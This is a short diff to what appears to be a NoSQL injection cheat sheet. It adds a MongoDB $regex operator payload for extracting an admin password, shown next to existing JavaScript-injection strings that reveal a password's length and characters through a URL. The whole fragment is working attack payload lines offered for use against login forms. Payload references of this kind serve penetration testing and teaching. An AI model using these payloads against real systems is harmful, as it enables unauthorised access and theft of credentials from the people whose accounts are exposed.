@@ -58,6 +58,7 @@ Extracting Password:
 ```
 ' && this.password.length < 50%00 >> For extracting password length in URL
 ' && this.password[0] == 'a'%00 >> For extracting password in URL
+{"username":"admin","password":{"$regex":"^a*"}} >> For extracting password via operator
 ```
 ### Identifying field names
 ```
